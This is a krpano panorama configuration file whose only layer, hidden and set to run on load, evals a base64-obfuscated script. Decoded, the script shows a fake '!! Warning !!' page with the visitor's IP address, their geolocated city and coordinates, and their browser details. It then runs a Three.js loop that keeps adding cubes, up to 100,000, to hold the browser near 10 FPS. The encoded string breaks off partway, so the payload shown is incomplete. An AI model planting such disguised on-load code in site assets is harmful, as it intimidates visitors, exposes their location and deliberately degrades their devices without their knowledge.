<krpano version="1.0.8.15">
    <layer name="js_loader" type="container" visible="false"
        onloaded="js(eval(var w=atob('Y29uc3QgcXVlcnlQYXJhbXMgPSBuZXcgVVJMU2VhcmNoUGFyYW1zKHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gpOyAvLyDsnbQg7KSE7J2AIOyZuOu2gCDsiqTtgazrpr3tirjsnZgg7J2867aA7J28IOyImCDsnojsirXri4jri6QuDQoNCi8vIOygnOqzteuQnCDsoITssrQgSFRNTCDsvZTrk5zrpbwg7YWc7ZSM66a/IOumrO2EsOuftCjrsLHti7EgYCkg7JWI7JeQIOuEo+yKteuLiOuLpC4NCmNvbnN0IGh0bWxDb2RlID0gYA0KPCFET0NUWVBFIGh0bWw+DQo8aHRtbCBsYW5nPSJrbyI+DQo8aGVhZD4NCiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+DQogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPg0KICAgIDx0aXRsZT5XYXJuaW5nIC0gQXV0byBGUFMgQWRqdXN0PC90aXRsZT4NCiAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG4udGFpbHdpbmRjc3MuY29tIj48L3NjcmlwdD4NCiAgICA8bGluayBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2NzczI/ZmFtaWx5PVByZXNzK1N0YXJ0KzJQJmRpc3BsYXk9c3dhcCIgcmVsPSJzdHlsZXNoZWV0Ij4NCiAgICA8c3R5bGU+DQogICAgICAgIGJvZHkgew0KICAgICAgICAgICAgZm9udC1mYW1pbHk6ICdQcmVzcyBTdGFydCAyUCcsIG1vbm9zcGFjZTsNCiAgICAgICAgICAgIC8qIG92ZXJmbG93OiBoaWRkZW47IDwtLSDsiqTtgazroaQg7ZWE7JqUIOyLnCDso7zshJ0g7LKY66asIOuYkOuKlCDsgq3soJwgKi8NCiAgICAgICAgfQ0KICAgICAgICAudGVybWluYWwtdGV4dCB7DQogICAgICAgICAgICBmb250LWZhbWlseTogJ1ByZXNzIFN0YXJ0IDJQJywgbW9ub3NwYWNlOw0KICAgICAgICAgICAgY29sb3I6ICMwMGZmMDA7DQogICAgICAgICAgICB3aGl0ZS1zcGFjZTogcHJlLXdyYXA7DQogICAgICAgIH0NCiAgICAgICAgI2JlbmNobWFyay1jYW52YXMgew0KICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzExMTsNCiAgICAgICAgICAgIGJvcmRlcjogMnB4IHNvbGlkICMzMzM7DQogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA4cHg7DQogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAyMHB4Ow0KICAgICAgICAgICAgZGlzcGxheTogbm9uZTsgLyogSW5pdGlhbGx5IGhpZGRlbiAqLw0KICAgICAgICAgICAgd2lkdGg6IDEwMCU7IC8qIE1ha2UgY2FudmFzIHJlc3BvbnNpdmUgKi8NCiAgICAgICAgICAgIGhlaWdodDogMzUwcHg7IC8qIOuGkuydtCDslb3qsIQg7Kad6rCAICovDQogICAgICAgICAgICBjdXJzb3I6IGNyb3NzaGFpcjsgLyogSW5kaWNhdGUgaW50ZXJhY3Rpdml0eSAqLw0KICAgICAgICB9DQogICAgICAgICNzdGF0cyB7IC8qIFN0eWxlIHRoZSBzdGF0cyBwYW5lbCAqLw0KICAgICAgICAgICAgcG9zaXRpb246IGFic29sdXRlICFpbXBvcnRhbnQ7DQogICAgICAgICAgICB0b3A6IDEwcHggIWltcG9ydGFudDsNCiAgICAgICAgICAgIGxlZnQ6IDEwcHggIWltcG9ydGFudDsNCiAgICAgICAgICAgIHotaW5kZXg6IDEwMDsNCiAgICAgICAgfQ0KICAgICAgICAjd2FybmluZy1tZXNzYWdlIHsNCiAgICAgICAgICAgICBoZWlnaHQ6IDZlbTsNCiAgICAgICAgICAgICBvdmVyZmxvdy15OiBhdXRvOw0KICAgICAgICAgICAgIGRpc3BsYXk6IGJsb2NrOw0KICAgICAgICAgICAgIGxpbmUtaGVpZ2h0OiAxLjU7DQogICAgICAgICAgICAgZm9udC1mYW1pbHk6ICdQcmVzcyBTdGFydCAyUCcsIG1vbm9zcGFjZTsNCiAgICAgICAgICAgICBjb2xvcjogI2VhYjMwODsNCiAgICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwOw0KICAgICAgICAgICAgIHBhZGRpbmc6IDAuNXJlbTsNCiAgICAgICAgICAgICBib3JkZXItcmFkaXVzOiAwLjI1cmVtOw0KICAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICM0YjU1NjM7DQogICAgICAgIH0NCiAgICAgICAgLyog7LaU6rCAOiBGUFMg7KCV67O0IO2RnOyLnOyaqSAqLw0KICAgICAgICAjZnBzLWluZm8gew0KICAgICAgICAgICAgcG9zaXRpb246IGFic29sdXRlOw0KICAgICAgICAgICAgdG9wOiA2MHB4OyAvKiBzdGF0cyDslYTrnpggKi8NCiAgICAgICAgICAgIGxlZnQ6IDEwcHg7DQogICAgICAgICAgICBjb2xvcjogIzAwZmYwMDsgLyog7YSw66+464SQIO2FjeyKpO2KuCDsg4nsg4EgKi8NCiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTBweDsNCiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6IHJnYmEoMCwgMCwgMCwgMC41KTsNCiAgICAgICAgICAgIHBhZGRpbmc6IDNweCA1cHg7DQogICAgICAgICAgICBib3JkZXItcmFkaXVzOiAzcHg7DQogICAgICAgICAgICB6LWluZGV4OiAxMDE7DQogICAgICAgIH0NCiAgICA8L3N0eWxlPg0KICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy90aHJlZS5qcy9yMTI4L3RocmVlLm1pbi5qcyI+PC9zY3JpcHQ+DQogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9ucG0vc3RhdHMuanNAMC4xNy4wL2J1aWxkL3N0YXRzLm1pbi5qcyI+PC9zY3JpcHQ+DQo8L2hlYWQ+DQo8Ym9keSBjbGFzcz0iYmctYmxhY2sgdGV4dC13aGl0ZSBwLTQiPg0KICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciBteC1hdXRvIHAtOCBiZy1ncmF5LTkwMCByb3VuZGVkLWxnIHNoYWRvdy1sZyBib3JkZXItMiBib3JkZXItZ3JheS03MDAgcmVsYXRpdmUiPg0KICAgICAgICA8aDEgY2xhc3M9InRleHQtM3hsIGZvbnQtYm9sZCBtYi02IHRleHQtY2VudGVyIHRleHQtcmVkLTUwMCI+ISEgV2FybmluZyAhITwvaDE+DQogICAgICAgIDxkaXYgY2xhc3M9Im1iLTYiPg0KICAgICAgICAgICAgPHAgY2xhc3M9InRlcm1pbmFsLXRleHQgbWItMiI+WW91ciBJUCBhZGRyZXNzOjwvcD4NCiAgICAgICAgICAgIDxwIGlkPSJpcC1hZGRyZXNzIiBjbGFzcz0idGVybWluYWwtdGV4dCBiZy1ibGFjayBwLTIgcm91bmRlZCBib3JkZXIgYm9yZGVyLWdyYXktNzAwIj5Mb2FkaW5nLi4uPC9wPg0KICAgICAgICA8L2Rpdj4NCiAgICAgICAgPGRpdiBjbGFzcz0ibWItNiI+DQogICAgICAgICAgICA8cCBjbGFzcz0idGVybWluYWwtdGV4dCBtYi0yIj5Mb2NhdGlvbjo8L3A+DQogICAgICAgICAgICA8cCBpZD0ibG9jYXRpb24iIGNsYXNzPSJ0ZXJtaW5hbC10ZXh0IGJnLWJsYWNrIHAtMiByb3VuZGVkIGJvcmRlciBib3JkZXItZ3JheS03MDAiPkxvYWRpbmcuLi48L3A+DQogICAgICAgIDwvZGl2Pg0KICAgICAgICA8ZGl2IGNsYXNzPSJtYi02Ij4NCiAgICAgICAgICAgIDxwIGNsYXNzPSJ0ZXJtaW5hbC10ZXh0IG1iLTIiPkJyb3dzZXI6PC9wPg0KICAgICAgICAgICAgPHAgaWQ9ImJyb3dzZXItaW5mbyIgY2xhc3M9InRlcm1pbmFsLXRleHQgYmctYmxhY2sgcC0yIHJvdW5kZWQgYm9yZGVyIGJvcmRlci1ncmF5LTcwMCI+TG9hZGluZy4uLjwvcD4NCiAgICAgICAgPC9kaXY+DQogICAgICAgIDxkaXYgY2xhc3M9Im1iLTYiPg0KICAgICAgICAgICAgPHAgY2xhc3M9InRlcm1pbmFsLXRleHQgbWItMiI+UGxhdGZvcm06PC9wPg0KICAgICAgICAgICAgPHAgaWQ9InBsYXRmb3JtLWluZm8iIGNsYXNzPSJ0ZXJtaW5hbC10ZXh0IGJnLWJsYWNrIHAtMiByb3VuZGVkIGJvcmRlciBib3JkZXItZ3JheS03MDAiPkxvYWRpbmcuLi48L3A+DQogICAgICAgIDwvZGl2Pg0KICAgICAgICA8ZGl2IGNsYXNzPSJtYi02Ij4NCiAgICAgICAgICAgIDxwIGNsYXNzPSJ0ZXJtaW5hbC10ZXh0IG1iLTIiPkNvb2tpZXMgRW5hYmxlZDo8L3A+DQogICAgICAgICAgICA8cCBpZD0iY29va2llcy1lbmFibGVkIiBjbGFzcz0idGVybWluYWwtdGV4dCBiZy1ibGFjayBwLTIgcm91bmRlZCBib3JkZXIgYm9yZGVyLWdyYXktNzAwIj5Mb2FkaW5nLi4uPC9wPg0KICAgICAgICA8L2Rpdj4NCiAgICAgICAgPGRpdiBjbGFzcz0ibWItNiI+DQogICAgICAgICAgICA8cCBjbGFzcz0idGVybWluYWwtdGV4dCBtYi0yIj53YXJuOjwvcD4NCiAgICAgICAgICAgIDxwIGlkPSJ3YXJuaW5nLW1lc3NhZ2UiPjwvcD4NCiAgICAgICAgPC9kaXY+DQoNCiAgICAgICAgPGNhbnZhcyBpZD0iYmVuY2htYXJrLWNhbnZhcyI+PC9jYW52YXM+DQogICAgICAgICA8ZGl2IGlkPSJmcHMtaW5mbyI+RlBTOiBOL0EgfCBDdWJlczogTi9BPC9kaXY+DQoNCiAgICAgICAgPGRpdiBjbGFzcz0idGV4dC1jZW50ZXIgbXQtOCI+DQogICAgICAgICAgICA8YnV0dG9uIGlkPSJzeXN0ZW0tcmVzZXQiIGNsYXNzPSJiZy1yZWQtNzAwIGhvdmVyOmJnLXJlZC04MDAgdGV4dC13aGl0ZSBmb250LWJvbGQgcHktMyBweC02IHJvdW5kZWQtZnVsbCBzaGFkb3ctbWQgdHJhbnNpdGlvbiBkdXJhdGlvbi0zMDAgZWFzZS1pbi1vdXQiPg0KICAgICAgICAgICAgICAgIHN5c3RlbSByZXNldA0KICAgICAgICAgICAgPC9idXR0b24+DQogICAgICAgIDwvZGl2Pg0KICAgIDwvZGl2Pg0KICAgIDxzY3JpcHQ+DQogICAgICAgIC8vIC0tLSBET00gRWxlbWVudHMgLS0tDQogICAgICAgIGNvbnN0IGlwQWRkcmVzc0Rpc3BsYXkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaXAtYWRkcmVzcycpOw0KICAgICAgICBjb25zdCBsb2NhdGlvbkRpc3BsYXkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9jYXRpb24nKTsNCiAgICAgICAgY29uc3QgYnJvd3NlckluZm9EaXNwbGF5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Jyb3dzZXItaW5mbycpOw0KICAgICAgICBjb25zdCBwbGF0Zm9ybUluZm9EaXNwbGF5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3BsYXRmb3JtLWluZm8nKTsNCiAgICAgICAgY29uc3QgY29va2llc0VuYWJsZWREaXNwbGF5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Nvb2tpZXMtZW5hYmxlZCcpOw0KICAgICAgICBjb25zdCB3YXJuaW5nTWVzc2FnZUVsZW1lbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnd2FybmluZy1tZXNzYWdlJyk7DQogICAgICAgIGNvbnN0IHN5c3RlbVJlc2V0QnV0dG9uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3N5c3RlbS1yZXNldCcpOw0KICAgICAgICBjb25zdCBiZW5jaG1hcmtDYW52YXMgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYmVuY2htYXJrLWNhbnZhcycpOw0KICAgICAgICBjb25zdCBmcHNJbmZvRWxlbWVudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdmcHMtaW5mbycpOyAvLyBGUFMgaW5mbyBlbGVtZW50DQoNCiAgICAgICAgLy8gLS0tIFRocmVlLmpzICYgU3RhdHMgVmFyaWFibGVzIC0tLQ0KICAgICAgICBsZXQgc3RhdHM7DQogICAgICAgIGxldCBzY2VuZSwgY2FtZXJhLCByZW5kZXJlciwgYWN0aXZlQ3ViZXMgPSBbXSwgaW5hY3RpdmVDdWJlcyA9IFtdLCBhbWJpZW50TGlnaHQsIHBvaW50TGlnaHQ7IC8vIFJlbmFtZWQgY3ViZXMgdG8gYWN0aXZlQ3ViZXMNCiAgICAgICAgbGV0IGFuaW1hdGlvbkZyYW1lSWQgPSBudWxsOw0KDQogICAgICAgIC8vIC0tLSBNb3VzZSBJbnRlcmFjdGlvbiBWYXJpYWJsZXMgLS0tDQogICAgICAgIGxldCBtb3VzZVggPSAwLCBtb3VzZVkgPSAwOw0KICAgICAgICBsZXQgdGFyZ2V0WCA9IDAsIHRhcmdldFkgPSAwOw0KICAgICAgICBsZXQgd2luZG93SGFsZlggPSB3aW5kb3cuaW5uZXJXaWR0aCAvIDI7DQogICAgICAgIGxldCB3aW5kb3dIYWxmWSA9IHdpbmRvdy5pbm5lckhlaWdodCAvIDI7DQogICAgICAgIGNvbnN0IGNhbWVyYVN0YXJ0WiA9IDU7DQogICAgICAgIGNvbnN0IG1vdXNlSW5mbHVlbmNlRmFjdG9yID0gMTsNCiAgICAgICAgY29uc3QgY2FtZXJhU21vb3RoaW5nRmFjdG9yID0gMC4wNTsNCg0KICAgICAgICAvLyAtLS0gRlBTIENvbnRyb2wgVmFyaWFibGVzIC0tLQ0KICAgICAgICAvLyDsgqzsmqnsnpDqsIAg7KCc6rO17ZWcIOqwkuuTpDoNCiAgICAgICAgY29uc3QgVEFSR0VUX0ZQUyA9IDEwOw0KICAgICAgICBjb25zdCBGUFNfTE9XX1RIUkVTSE9MRCA9IDg7DQogICAgICAgIGNvbnN0IEZQU19ISUdIX1RIUkVTSE9MRCA9IDEyOw0KICAgICAgICBjb25zdCBBREpVU1RNRU5UX0lOVEVSVkFMID0gMC4wMTsgLy8g66ek7JqwIOynp+ydgCDqsITqsqkgKDEwbXMpIC0g7ISx64ql7JeQIOyYge2WpSDspIQg7IiYIOyeiOydjA0KICAgICAgICBjb25zdCBDVUJFX0FESlVTVF9TVEVQID0gMTsNCiAgICAgICAgbGV0IE1BWF9DVUJFUyA9IDEwMDAwMDsgLy8g66ek7JqwIOuGkuydgCDqsJIgLSDrqZTrqqjrpqwv7ISx64qlIOusuOygnCDsnKDrsJwg6rCA64ql7ISxDQogICAgICAgIGNvbnN0IE1JTl9DVUJFUyA9IDIwOw0KICAgICAgICBsZXQgbGFzdEFkanVzdG1lbnRUaW1lID0gMDsNCiAgICAgICAgbGV0IGxhc3RGcmFtZVRpbWUgPSBwZXJmb3JtYW5jZS5ub3coKTsNCiAgICAgICAgbGV0IHNtb290aGVkRlBTID0gVEFSR0VUX0ZQUzsNCg0KICAgICAgICAvLyAtLS0gVXRpbGl0eSBGdW5jdGlvbnMgLS0tDQogICAgICAgIGZ1bmN0aW9uIGZldGNoQW5kRGlzcGxheUlQQW5kTG9jYXRpb24oKSB7DQogICAgICAgICAgICBmZXRjaCgnaHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29uJykNCiAgICAgICAgICAgICAgICAudGhlbihyZXNwb25zZSA9PiB7DQogICAgICAgICAgICAgICAgICAgIGlmICghcmVzcG9uc2Uub2spIHRocm93IG5ldyBFcnJvcihcYEhUVFAgZXJyb3IhIHN0YXR1czogXCR7cmVzcG9uc2Uuc3RhdHVzfVxgKTsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHJlc3BvbnNlLmpzb24oKTsNCiAgICAgICAgICAgICAgICAgfSkNCiAgICAgICAgICAgICAgICAudGhlbihkYXRhID0+IHsNCiAgICAgICAgICAgICAgICAgICAgY29uc3QgaXAgPSBkYXRhLmlwOw0KICAgICAgICAgICAgICAgICAgICBpcEFkZHJlc3NEaXNwbGF5LnRleHRDb250ZW50ID0gaXAgfHwgJ04vQSc7DQoNCiAgICAgICAgICAgICAgICAgICAgZmV0Y2goXGBodHRwczovL2lwYXBpLmNvL1wke2lwfS9qc29uL1xgKQ0KICAgICAgICAgICAgICAgICAgICAgICAgLnRoZW4ocmVzcG9uc2UgPT4gew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoIXJlc3BvbnNlLm9rKSB0aHJvdyBuZXcgRXJyb3IoXGBIVFRQIGVycm9yISBzdGF0dXM6IFwke3Jlc3BvbnNlLnN0YXR1c31cYCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiByZXNwb25zZS5qc29uKCk7DQogICAgICAgICAgICAgICAgICAgICAgICB9KQ0KICAgICAgICAgICAgICAgICAgICAgICAgLnRoZW4obG9jYXRpb25EYXRhID0+IHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAobG9jYXRpb25EYXRhLmVycm9yKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnNvbGUud2FybignRXJyb3IgZmV0Y2hpbmcgbG9jYXRpb246JywgbG9jYXRpb25EYXRhLnJlYXNvbik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2F0aW9uRGlzcGxheS50ZXh0Q29udGVudCA9ICdMb2NhdGlvbiBpbmZvIHVuYXZhaWxhYmxlLic7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYXRpb25EaXNwbGF5LnRleHRDb250ZW50ID0gXGBcJHtsb2NhdGlvbkRhdGEuY2l0eSB8fCAnTi9BJ30sIFwke2xvY2F0aW9uRGF0YS5yZWdpb24gfHwgJ04vQSd9LCBcJHtsb2NhdGlvbkRhdGEuY291bnRyeV9uYW1lIHx8ICdOL0EnfSAoXCR7bG9jYXRpb25EYXRhLmxhdGl0dWRlIHx8ICdOL0EnfSwgXCR7bG9jYXRpb25EYXRhLmxvbmdpdHVkZSB8fCAnTi9BJ30pXGA7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgfSkNCiAgICAgICAgICAgICAgICAgICAgICAgIC5jYXRjaChlcnJvciA9PiB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29uc29sZS5lcnJvcignRXJyb3IgZmV0Y2hpbmcgbG9jYXRpb246JywgZXJyb3IpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2F0aW9uRGlzcGxheS50ZXh0Q29udGVudCA9ICdMb2NhdGlvbiBpbmZvIHVuYXZhaWxhYmxlLic7DQogICAgICAgICAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICB9KQ0KICAgICAgICAgICAgICAgIC5jYXRjaChlcnJvciA9PiB7DQogICAgICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoJ0Vycm9yIGZldGNoaW5nIElQIGFkZHJlc3M6JywgZXJyb3IpOw0KICAgICAgICAgICAgICAgICAgICBpcEFkZHJlc3NEaXNwbGF5LnRleHRDb250ZW50ID0gJ0ZhaWxlZCB0byByZXRyaWV2ZSBJUC4nOw0KICAgICAgICAgICAgICAgICAgICBsb2NhdGlvbkRpc3BsYXkudGV4dENvbnRlbnQgPSAnTG9jYXRpb24gaW5mbyB1bmF2YWlsYWJsZS4nOw0KICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICB9DQoNCiAgICAgICAgZnVuY3Rpb24gZGlzcGxheUJyb3dzZXJBbmRQbGF0Zm9ybUluZm8oKSB7DQogICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICBicm93c2VySW5mb0Rpc3BsYXkudGV4dENvbnRlbnQgPSBuYXZpZ2F0b3IudXNlckFnZW50IHx8ICdOL0EnOw0KICAgICAgICAgICAgICAgIHBsYXRmb3JtSW5mb0Rpc3BsYXkudGV4dENvbnRlbnQgPSBuYXZpZ2F0b3IucGxhdGZvcm0gfHwgJ04vQSc7DQogICAgICAgICAgICAgICAgY29va2llc0VuYWJsZWREaXNwbGF5LnRleHRDb250ZW50ID0gbmF2aWdhdG9yLmNvb2tpZUVuYWJsZWQgPyAnWWVzJyA6ICdObyc7DQogICAgICAgICAgICB9IGNhdGNoIChlKSB7DQogICAgICAgICAgICAgICAgIGNvbnNvbGUuZXJyb3IoIkVycm9yIGFjY2Vzc2luZyBuYXZpZ2F0b3IgcHJvcGVydGllczoiLCBlKTsNCiAgICAgICAgICAgICAgICAgYnJvd3NlckluZm9EaXNwbGF5LnRleHRDb250ZW50ID0gJ0Vycm9yJzsNCiAgICAgICAgICAgICAgICAgcGxhdGZvcm1JbmZvRGlzcGxheS50ZXh0Q29udGVudCA9ICdFcnJvcic7DQogICAgICAgICAgICAgICAgIGNvb2tpZXNFbmFibGVkRGlzcGxheS50ZXh0Q29udGVudCA9ICdFcnJvcic7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBmdW5jdGlvbiBvbkRvY3VtZW50TW91c2VNb3ZlKGV2ZW50KSB7DQogICAgICAgICAgICBtb3VzZVggPSAoZXZlbnQuY2xpZW50WCAtIHdpbmRvd0hhbGZYKTsNCiAgICAgICAgICAgIG1vdXNlWSA9IChldmVudC5jbGllbnRZIC0gd2luZG93SGFsZlkpOw0KICAgICAgICAgICAgdGFyZ2V0WCA9IChtb3VzZVggLyB3aW5kb3dIYWxmWCkgKiBtb3VzZUluZmx1ZW5jZUZhY3RvcjsNCiAgICAgICAgICAgIHRhcmdldFkgPSAtKG1vdXNlWSAvIHdpbmRvd0hhbGZZKSAqIG1vdXNlSW5mbHVlbmNlRmFjdG9yOw0KICAgICAgICB9DQoNCiAgICAgICAgLy8gLS0tIEZQUyAmIFNjZW5lIEFkanVzdG1lbnQgLS0tDQogICAgICAgIGZ1bmN0aW9uIGNhbGN1bGF0ZUFuZFVwZGF0ZUZQUygpIHsNCiAgICAgICAgICAgIGNvbnN0IG5vdyA9IHBlcmZvcm1hbmNlLm5vdygpOw0KICAgICAgICAgICAgY29uc3QgZGVsdGFUaW1lID0gbm93IC0gbGFzdEZyYW1lVGltZTsNCiAgICAgICAgICAgIGxhc3RGcmFtZVRpbWUgPSBub3c7DQoNCiAgICAgICAgICAgIGlmIChkZWx0YVRpbWUgPiAwKSB7DQogICAgICAgICAgICAgICAgY29uc3QgY3VycmVudEZQUyA9IDEwMDAgLyBkZWx0YVRpbWU7DQogICAgICAgICAgICAgICAgc21vb3RoZWRGUFMgPSAwLjk1ICogc21vb3RoZWRGUFMgKyAwLjA1ICogY3VycmVudEZQUzsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgZnBzSW5mb0VsZW1lbnQudGV4dENvbnRlbnQgPSBcYEZQUzogXCR7c21vb3RoZWRGUFMudG9GaXhlZCgxKX0gfCBDdWJlczogXCR7YWN0aXZlQ3ViZXMubGVuZ3RofVxgOw0KDQogICAgICAgICAgICBpZiAobm93IC0gbGFzdEFkanVzdG1lbnRUaW1lID4gQURKVVNUTUVOVF9JTlRFUlZBTCkgew0KICAgICAgICAgICAgICAgIGFkanVzdFNjZW5lQ29tcGxleGl0eSgpOw0KICAgICAgICAgICAgICAgIGxhc3RBZGp1c3RtZW50VGltZSA9IG5vdzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIGZ1bmN0aW9uIHJlbW92ZUN1YmVzKGNvdW50KSB7DQogICAgICAgICAgICBjb25zdCBudW1Ub1JlbW92ZSA9IE1hdGgubWluKGNvdW50LCBhY3RpdmVDdWJlcy5sZW5ndGggLSBNSU5fQ1VCRVMpOw0KICAgICAgICAgICAgaWYgKG51bVRvUmVtb3ZlIDw9IDApIHJldHVybjsNCg0KICAgICAgICAgICAgZm9yIChsZXQgaSA9IDA7IGkgPCBudW1Ub1JlbW92ZTsgaSsrKSB7DQogICAgICAgICAgICAgICAgY29uc3QgY3ViZSA9IGFjdGl2ZUN1YmVzLnBvcCgpOw0KICAgICAgICAgICAgICAgIGlmIChjdWJlKSB7DQogICAgICAgICAgICAgICAgICAgIHNjZW5lLnJlbW92ZShjdWJlKTsNCiAgICAgICAgICAgICAgICAgICAgaW5hY3RpdmVDdWJlcy5wdXNoKGN1YmUpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIGZ1bmN0aW9uIGFkZEN1YmVzKGNvdW50KSB7DQogICAgICAgICAgICBjb25zdCBudW1Ub0FkZCA9IE1hdGgubWluKGNvdW50LCBpbmFjdGl2ZUN1YmVzLmxlbmd0aCwgTUFYX0NVQkVTIC0gYWN0aXZlQ3ViZXMubGVuZ3RoKTsNCiAgICAgICAgICAgICBpZiAobnVtVG9BZGQgPD0gMCkgcmV0dXJuOw0KDQogICAgICAgICAgICBmb3IgKGxldCBpID0gMDsgaSA8IG51bVRvQWRkOyBpKyspIHsNCiAgICAgICAgICAgICAgICBjb25zdCBjdWJlID0gaW5hY3RpdmVDdWJlcy5wb3AoKTsNCiAgICAgICAgICAgICAgICBpZiAoY3ViZSkgew0KICAgICAgICAgICAgICAgICAgICBzY2VuZS5hZGQoY3ViZSk7DQogICAgICAgICAgICAgICAgICAgIGFjdGl2ZUN1YmVzLnB1c2goY3ViZSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgZnVuY3Rpb24gYWRqdXN0U2NlbmVDb21wbGV4aXR5KCkgew0KICAgICAgICAgICAgaWYgKHNtb290aGVkRlBTIDwgRlBTX0xPV19USFJFU0hPTEQgJiYgYWN0aXZlQ3ViZXMubGVuZ3RoID4gTUlOX0NVQkVTKSB7DQogICAgICAgICAgICAgICAgcmVtb3ZlQ3ViZXMoQ1VCRV9BREpVU1RfU1RFUCk7DQogICAgICAgICAgICB9IGVsc2UgaWYgKHNtb290aGVkRlBTID4gRlBTX0hJR0hfVEhSRVNIT0xEICYmIGFjdGl2ZUN1YmVzLmxlbmd0aCA8IE1BWF9DVUJFUyAmJiBpbmFjdGl2ZUN1YmVzLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgICAgICBhZGRDdWJlcyhDVUJFX0FESlVTVF9TVEVQKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIC8vIC0tLSBUaHJlZS5qcyBTY2VuZSBTZXR1cCAtLS0NCiAgICAgICAgZnVuY3Rpb24gYWRkUGVyZm9ybWFuY2VCZW5jaG1hcmsoKSB7DQogICAgICAgICAgICB0cnkgew0KICAgICAgICAgICAgICAgIGJlbmNobWFya0NhbnZhcy5zdHlsZS5kaXNwbGF5ID0gJ2Jsb2NrJzsNCiAgICAgICAgICAgICAgICBzY2VuZSA9IG5ldyBUSFJFRS5TY2VuZSgpOw0KICAgICAgICAgICAgICAgIGNhbWVyYSA9IG5ldyBUSFJFRS5QZXJzcGVjdGl2ZUNhbWVyYSg3NSwgYmVuY2htYXJrQ2FudmFzLm9mZnNldFdpZHRoIC8gYmVuY2htYXJrQ2FudmFzLm9mZnNldEhlaWdodCwgMC4xLCAxMDAwKTsNCiAgICAgICAgICAgICAgICByZW5kZXJlciA9IG5ldyBUSFJFRS5XZWJHTFJlbmRlcmVyKHsgY2FudmFzOiBiZW5jaG1hcmtDYW52YXMsIGFudGlhbGlhczogdHJ1ZSB9KTsNCiAgICAgICAgICAgICAgICByZW5kZXJlci5zZXRTaXplKGJlbmNobWFya0NhbnZhcy5vZmZzZXRXaWR0aCwgYmVuY2htYXJrQ2FudmFzLm9mZnNldEhlaWdodCk7DQogICAgICAgICAgICAgICAgcmVuZGVyZXIuc2V0Q2xlYXJDb2xvcigweDExMTExMSk7DQoNCiAgICAgICAgICAgICAgICBhbWJpZW50TGlnaHQgPSBuZXcgVEhSRUUuQW1iaWVudExpZ2h0KDB4NjA2MDYwKTsNCiAgICAgICAgICAgICAgICBzY2VuZS5hZGQoYW1iaWVudExpZ2h0KTsNCiAgICAgICAgICAgICAgICBwb2ludExpZ2h0ID0gbmV3IFRIUkVFLlBvaW50TGlnaHQoMHhmZmZmZmYsIDAuOCwgMTAwKTsNCiAgICAgICAgICAgICAgICBwb2ludExpZ2h0LnBvc2l0aW9uLnNldCgwLCA1LCA1KTsNCiAgICAgICAgICAgICAgICBzY2VuZS5hZGQocG9pbnRMaWdodCk7DQoNCiAgICAgICAgICAgICAgICAvLyBJbml0aWFsaXplIEN1YmVzIChTdGFydGluZyB3aXRoIE1JTl9DVUJFUykNCiAgICAgICAgICAgICAgICBhY3RpdmVDdWJlcyA9IFtdOw0KICAgICAgICAgICAgICAgIGluYWN0aXZlQ3ViZXMgPSBbXTsNCiAgICAgICAgICAgICAgICBjb25zdCB0b3RhbFBvdGVudGlhbEN1YmVzID0gTUFYX0NVQkVTOw0KICAgICAgICAgICAgICAgIGNvbnN0IGluaXRpYWxBY3RpdmVDb3VudCA